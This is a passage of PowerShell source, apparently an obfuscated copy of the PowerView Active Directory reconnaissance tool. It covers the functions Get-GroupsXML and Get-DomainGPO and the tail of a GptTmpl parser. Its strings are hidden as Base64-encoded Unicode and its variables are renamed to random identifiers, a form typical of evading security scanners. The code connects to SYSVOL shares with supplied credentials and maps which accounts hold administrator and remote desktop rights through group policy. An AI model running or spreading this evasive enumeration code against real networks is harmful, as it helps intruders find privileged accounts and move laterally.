[${a1860b7049e841f1b625f2c14fda5cb8}]) {
                    Add-
RemoteConnection -Path ${a1860b7049e841f1b625f2c14fda5cb8} -
Credential $Credential
                    
${6ff55a488453497ca90f5967d10128a7}
[${a1860b7049e841f1b625f2c14fda5cb8}] = $True
                }
       
     }
            ${326e3c43e266487880a9f78001b3260b} = 
$GptTmplPath
            if (-not 
${326e3c43e266487880a9f78001b3260b}.EndsWith
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('LgBpAG4AZgA='))))) {
                
${326e3c43e266487880a9f78001b3260b} += 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8Adw
BzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA=')
))
            }
            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEcAcAB0AFQAbQBwAGwAXQAgAFAAYQByAHMAaQBuAGcAIABHAHAAdA
BUAG0AcABsAFAAYQB0AGgAOgAgACQAewAzADIANgBlADMAYwA0ADMAZQAyADYANgA0AD
gANwA4ADgAMABhADkAZgA3ADgAMAAwADEAYgAzADIANgAwAGIAfQA=')))
           
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) 
{
                ${b806de80cb3d4b2ebb4da69abd3c3ee4} = Get-
IniContent -Path ${326e3c43e266487880a9f78001b3260b} -OutputObject 
-ErrorAction Stop
                if 
(${b806de80cb3d4b2ebb4da69abd3c3ee4}) {
                    
${b806de80cb3d4b2ebb4da69abd3c3ee4} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABhAHQAaAA='))) ${326e3c43e266487880a9f78001b3260b}
               
     ${b806de80cb3d4b2ebb4da69abd3c3ee4}
                }
            
}
            else {
                
${b806de80cb3d4b2ebb4da69abd3c3ee4} = Get-IniContent -Path 
${326e3c43e266487880a9f78001b3260b} -ErrorAction Stop
                
if (${b806de80cb3d4b2ebb4da69abd3c3ee4}) {
                    
${b806de80cb3d4b2ebb4da69abd3c3ee4}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABhAHQAaAA=')))] = ${326e3c43e266487880a9f78001b3260b}
            
        ${b806de80cb3d4b2ebb4da69abd3c3ee4}
                }
         
   }
        }
        catch {
            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEcAcAB0AFQAbQBwAGwAXQAgAEUAcgByAG8AcgAgAHAAYQByAHMAaQ
BuAGcAIAAkAHsAMwAyADYAZQAzAGMANAAzAGUAMgA2ADYANAA4ADcAOAA4ADAAYQA5AG
YANwA4ADAAMAAxAGIAMwAyADYAMABiAH0AIAA6ACAAJABfAA==')))
        }
    
}
    END {
        ${6ff55a488453497ca90f5967d10128a7}.Keys | 
ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}
function 
Get-GroupsXML {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    
[CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('Path')]
        [String]
        
$GroupsXMLPath,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${6ff55a488453497ca90f5967d10128a7} = @{}
    }
    PROCESS {
        
try {
            if (($GroupsXMLPath -Match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                
${a1860b7049e841f1b625f2c14fda5cb8} = "\\$((New-Object System.Uri
($GroupsXMLPath)).Host)\SYSVOL"
                if (-not 
${6ff55a488453497ca90f5967d10128a7}
[${a1860b7049e841f1b625f2c14fda5cb8}]) {
                    Add-
RemoteConnection -Path ${a1860b7049e841f1b625f2c14fda5cb8} -
Credential $Credential
                    
${6ff55a488453497ca90f5967d10128a7}
[${a1860b7049e841f1b625f2c14fda5cb8}] = $True
                }
       
     }
            [XML]${9dc908244a1f4f41922f2afbb3df7b8f} = Get-
Content -Path $GroupsXMLPath -ErrorAction Stop
            
${9dc908244a1f4f41922f2afbb3df7b8f} | Select-Xml 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('LwBHAHIAbwB1AHAAcwAvAEcAcgBvAHUAcAA='))) | Select-Object -
ExpandProperty node | ForEach-Object {
                $Groupname = 
$_.Properties.groupName
                
${55e6f9b7e70241398335631b9e828ed6} = $_.Properties.groupSid
         
       if (-not ${55e6f9b7e70241398335631b9e828ed6}) {
               
     if ($Groupname -match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                    
    ${55e6f9b7e70241398335631b9e828ed6} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
                    }
          
          elseif ($Groupname -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAG0AbwB0AGUAIABEAGUAcwBrAHQAbwBwAA==')))) {
                    
    ${55e6f9b7e70241398335631b9e828ed6} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
                    }
          
          elseif ($Groupname -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwB1AGUAcwB0AHMA')))) {
                        
${55e6f9b7e70241398335631b9e828ed6} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))
                    }
          
          else {
                        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            
${55e6f9b7e70241398335631b9e828ed6} = ConvertTo-SID -ObjectName 
$Groupname -Credential $Credential
                        }
          
              else {
                            
${55e6f9b7e70241398335631b9e828ed6} = ConvertTo-SID -ObjectName 
$Groupname
                        }
                    }
             
   }
                $Members = $_.Properties.members | Select-Object 
-ExpandProperty Member | Where-Object { $_.action -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBEAEQA'))) } | ForEach-Object {
                    if ($_.sid) { 
$_.sid }
                    else { $_.name }
                }
        
        if ($Members) {
                    if ($_.filters) {
         
               ${d56b878e1dc94c2f8fb5072252fed9bd} = 
$_.filters.GetEnumerator() | ForEach-Object {
                        
    New-Object -TypeName PSObject -Property @{'Type' = 
$_.LocalName;'Value' = $_.name}
                        }
             
       }
                    else {
                        
${d56b878e1dc94c2f8fb5072252fed9bd} = $Null
                    }
     
               if ($Members -isnot [System.Array]) { $Members = @
($Members) }
                    ${b1267b499e534ca2a7d6f01e9054071c} 
= New-Object PSObject
                    
${b1267b499e534ca2a7d6f01e9054071c} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBQAE8AUABhAHQAaAA='))) $TargetGroupsXMLPath
                    
${b1267b499e534ca2a7d6f01e9054071c} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBpAGwAdABlAHIAcwA='))) ${d56b878e1dc94c2f8fb5072252fed9bd}
       
             ${b1267b499e534ca2a7d6f01e9054071c} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) 
$GroupName
                    ${b1267b499e534ca2a7d6f01e9054071c} | 
Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RwByAG8AdQBwAFMASQBEAA=='))) 
${55e6f9b7e70241398335631b9e828ed6}
                    
${b1267b499e534ca2a7d6f01e9054071c} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAE0AZQBtAGIAZQByAE8AZgA='))) $Null
                    
${b1267b499e534ca2a7d6f01e9054071c} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAE0AZQBtAGIAZQByAHMA'))) $Members
                    
${b1267b499e534ca2a7d6f01e9054071c}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAAcwBYAE0ATAA='))))
          
          ${b1267b499e534ca2a7d6f01e9054071c}
                }
       
     }
        }
        catch {
            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEcAcgBvAHUAcABzAFgATQBMAF0AIABFAHIAcgBvAHIAIABwAGEAcg
BzAGkAbgBnACAAJABUAGEAcgBnAGUAdABHAHIAbwB1AHAAcwBYAE0ATABQAGEAdABoAC
AAOgAgACQAXwA=')))
        }
    }
    END {
        
${6ff55a488453497ca90f5967d10128a7}.Keys | ForEach-Object { Remove-
RemoteConnection -Path $_ }
    }
}
function Get-DomainGPO {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType
('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    
[CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        
[Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias
('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
   
     $Identity,
        [Parameter(ParameterSetName = 
'ComputerIdentity')]
        [Alias('ComputerName')]
        
[ValidateNotNullOrEmpty()]
        [String]
        
$ComputerIdentity,
        [Parameter(ParameterSetName = 
'UserIdentity')]
        [Alias('UserName')]
        
[ValidateNotNullOrEmpty()]
        [String]
        $UserIdentity,
     
   [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        
[ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
  
      $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String
[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        
[Alias('ADSPath')]
        [String]
        $SearchBase,
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 
'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        
[ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 
'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        
[Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        
[Switch]
        $FindOne,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [Switch]
        
$Raw
    )
    BEGIN {
        ${ea43c787582f45539b7f519da4680c7a} = @
{}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
       
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${75eab98b9e2d47af8ed389c47d53c203} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
    }
    PROCESS {
        if 
(${75eab98b9e2d47af8ed389c47d53c203}) {
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))] -or 
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) 
{
                ${aa3931df01fd426e911349f25dacfb94} = @()
           
     if (${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
                    
${5385ca78f2754c48944175119f5a58a0} = 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
                }
                
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAZABuAHMAaABvAHMAdA
BuAGEAbQBlAA==')))
                
${5c3a6e85bd4d471ca3a59cc3cb16dcbc} = $Null
                if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))]) {
               
     ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = $ComputerIdentity
                  
  ${9c0baec859734fc983ee3c04b4cde8a7} = Get-DomainComputer 
@ea43c787582f45539b7f519da4680c7a -FindOne | Select-Object -First 1
  
                  if(-not ${9c0baec859734fc983ee3c04b4cde8a7}) {
     
                   Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABDAG8AbQBwAHUAdABlAHIAIA
AnACQAQwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQAnACAAbgBvAHQAIABmAG
8AdQBuAGQAIQA=')))
                    }
                    
${77ca87db65af46af91551f70812dbd42} = 
${9c0baec859734fc983ee3c04b4cde8a7}.distinguishedname
                
    ${5c3a6e85bd4d471ca3a59cc3cb16dcbc} = 
${9c0baec859734fc983ee3c04b4cde8a7}.dnshostname
                }
     
           else {
                    
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity
                    
$User = Get-DomainUser @ea43c787582f45539b7f519da4680c7a -FindOne | 
Select-Object -First 1
                    if(-not $User) {
           
             Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABVAHMAZQByACAAJwAkAFUAcw
BlAHIASQBkAGUAbgB0AGkAdAB5ACcAIABuAG8AdAAgAGYAbwB1AG4AZAAhAA==')))
   
                 }
                    
${77ca87db65af46af91551f70812dbd42} = $User.distinguishedname
        
        }
                ${815b6a3ecc6e4d3ea7f5bc32771cd28b} = @()
   
             ${815b6a3ecc6e4d3ea7f5bc32771cd28b} += 
${77ca87db65af46af91551f70812dbd42}.split(',') | ForEach-Object {
    
                if($_.startswith
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBVAD0A'))))) {
                        
${77ca87db65af46af91551f70812dbd42}.SubString
(${77ca87db65af46af91551f70812dbd42}.IndexOf("$($_),"))
              
      }
                }
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABvAGIAagBlAGMAdAAgAE8AVQ
BzADoAIAAkAHsAOAAxADUAYgA2AGEAMwBlAGMAYwA2AGUANABkADMAZQBhADcAZgA1AG
IAYwAzADIANwA3ADEAYwBkADIAOABiAH0A')))
                if 
(${815b6a3ecc6e4d3ea7f5bc32771cd28b}) {
                    
${ea43c787582f45539b7f519da4680c7a}.Remove
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA='))))
                    
${51fd2e21345846ba8ba09cf9f56c2b31} = $False
                    
ForEach(${b4f1009599f54e7894515dd307c665ff} in 
${815b6a3ecc6e4d3ea7f5bc32771cd28b}) {
                        
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = 
${b4f1009599f54e7894515dd307c665ff}
                        
${aa3931df01fd426e911349f25dacfb94} += Get-DomainOU 
@ea43c787582f45539b7f519da4680c7a | ForEach-Object {
                 
           if ($_.gplink) {
                                
$_.gplink.split('][') | ForEach-Object {
                             
       if ($_.startswith($([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                   
                     ${9ddda9862ee14f3b86a47baf42469d04} = $_.split
(';')
                                        
${6c551f6b9c254083956551338129a73d} = 
${9ddda9862ee14f3b86a47baf42469d04}[0]
                               
         ${9564a31d372d4037b14c2127812f513b} = 
${9ddda9862ee14f3b86a47baf42469d04}[1]
                               
         if (${51fd2e21345846ba8ba09cf9f56c2b31}) {
                  
                          if (${9564a31d372d4037b14c2127812f513b} -
eq 2) {
                                                
${6c551f6b9c254083956551338129a73d}
                                  
          }
                                        }
                 
                       else {
                                        
    ${6c551f6b9c254083956551338129a73d}
                              
          }
                                    }
                     
           }
                            }
                            
if ($_.gpoptions -eq 1) {
                                
${51fd2e21345846ba8ba09cf9f56c2b31} = $True
                          
  }
                        }
                    }
                }
   
             if (${5c3a6e85bd4d471ca3a59cc3cb16dcbc}) {
              
      ${c57ce429cada4aedb1e5c54e27150c97} = (Get-NetComputerSiteName 
-ComputerName ${5c3a6e85bd4d471ca3a59cc3cb16dcbc}).SiteName
          
          if(${c57ce429cada4aedb1e5c54e27150c97} -and 
(${c57ce429cada4aedb1e5c54e27150c97} -notlike 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RQByAHIAbwByACoA'))))) {
                        
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = 
${c57ce429cada4aedb1e5c54e27150c97}
                        
${aa3931df01fd426e911349f25dacfb94} += Get-DomainSite 
@ea43c787582f45539b7f519da4680c7a | ForEach-Object {
                 
           if($_.gplink) {
                                
$_.gplink.split('][') | ForEach-Object {
                             
       if ($_.startswith($([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                   
                     $_.split(';')[0]
                                
    }
                                }
                            }
  
                      }
                    }
                }
        
        ${fa82f2d49ba44130911c94516bf8fbd0} = 
${77ca87db65af46af91551f70812dbd42}.SubString
(${77ca87db65af46af91551f70812dbd42}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A')))))
                
${ea43c787582f45539b7f519da4680c7a}.Remove
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA=='))))
                
${ea43c787582f45539b7f519da4680c7a}.Remove
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA='))))
                
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABjAGwAYQBzAHMAPQBkAG8AbQBhAGkAbgApACgAZABpAHMAdA
BpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAD0AJAB7AGYAYQA4ADIAZgAyAGQANAA5AG
IAYQA0ADQAMQAzADAAOQAxADEAYwA5ADQANQAxADYAYgBmADgAZgBiAGQAMAB9ACkA')
))
                ${aa3931df01fd426e911349f25dacfb94} += Get-
DomainObject @ea43c787582f45539b7f519da4680c7a | ForEach-Object {
    
                if($_.gplink) {
                        
$_.gplink.split('][') | ForEach-Object {
                            
if ($_.startswith($([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                   
             $_.split(';')[0]
                            }
           
             }
                    }
                }
                
Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABHAFAATwBBAGQAcwBQAGEAdA
BoAHMAOgAgACQAewBhAGEAMwA5ADMAMQBkAGYAMAAxAGYAZAA0ADIANgBlADkAMQAxAD
MANAA5AGYAMgA1AGQAYQBjAGYAYgA5ADQAfQA=')))
                if 
(${5385ca78f2754c48944175119f5a58a0}) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = 
${5385ca78f2754c48944175119f5a58a0} }
                else { 
${ea43c787582f45539b7f519da4680c7a}.Remove
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))) }
                
${ea43c787582f45539b7f519da4680c7a}.Remove
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA=='))))
                
${aa3931df01fd426e911349f25dacfb94} | Where-Object {$_ -and ($_ -ne 
'')} | ForEach-Object {
                    
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $_
                    
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBnAHIAbwB1AHAAUABvAGwAaQ
BjAHkAQwBvAG4AdABhAGkAbgBlAHIAKQA=')))
                    Get-
DomainObject @ea43c787582f45539b7f519da4680c7a | ForEach-Object {
    
                    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBhAHcA')))]) {
                            
$_.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwAuAFIAYQB3AA=='))))
              
          }
                        else {
                            
$_.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwA='))))
                        
}
                        $_
                    }
                }
    
        }
            else {
                
${987d1cda8c15450d8512978866836ba0} = ''
                $Filter = 
''
                $Identity | Where-Object {$_} | ForEach-Object {
   
                 ${0c2b6ec1d84e4c9188d4d73c607426d3} = $_.Replace
('(', $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XAAyADgA')))).Replace(')', 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XAAyADkA'))))
                    if 
(${0c2b6ec1d84e4c9188d4d73c607426d3} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUAA6AC8ALwB8AF4AQwBOAD0ALgAqAA==')))) {
                    
    ${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMABjADIAYg
A2AGUAYwAxAGQAOAA0AGUANABjADkAMQA4ADgAZAA0AGQANwAzAGMANgAwADcANAAyAD
YAZAAzAH0AKQA=')))
                        if ((-not 
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not 
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
  
                          ${84423cbf5a544fd6aa05dc7201f84256} = 
${0c2b6ec1d84e4c9188d4d73c607426d3}.SubString
(${0c2b6ec1d84e4c9188d4d73c607426d3}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
                     Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABFAHgAdAByAGEAYwB0AGUAZA
AgAGQAbwBtAGEAaQBuACAAJwAkAHsAOAA0ADQAMgAzAGMAYgBmADUAYQA1ADQANABmAG
QANgBhAGEAMAA1AGQAYwA3ADIAMAAxAGYAOAA0ADIANQA2AH0AJwAgAGYAcgBvAG0AIA
AnACQAewAwAGMAMgBiADYAZQBjADEAZAA4ADQAZQA0AGMAOQAxADgAOABkADQAZAA3AD
MAYwA2ADAANwA0ADIANgBkADMAfQAnAA==')))
                            
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = ${84423cbf5a544fd6aa05dc7201f84256}
        
                    ${75eab98b9e2d47af8ed389c47d53c203} = Get-
DomainSearcher @ea43c787582f45539b7f519da4680c7a
                     
       if (-not ${75eab98b9e2d47af8ed389c47d53c203}) {
               
                 Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
